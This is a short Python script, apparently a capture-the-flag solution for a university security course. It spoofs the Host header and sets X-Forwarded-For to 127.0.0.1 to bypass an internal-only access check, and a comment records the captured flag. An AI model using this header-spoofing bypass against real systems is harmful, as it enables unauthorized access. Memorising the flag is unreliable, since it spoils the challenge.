import requests
IP = 'http://ctf99.cs.ui.ac.id:9005/'

headers = {
    'host': 'internal.ctf99.cs.ui.ac.id',
    'X-Forwarded-For': "127.0.0.1"
}
print(headers)
response = requests.post(IP, headers=headers)  # CSCE604258{w3_c4n_ACCess_it_fr0m_InterNal_Bruhh_4fter_Blunder}
print(response.text)
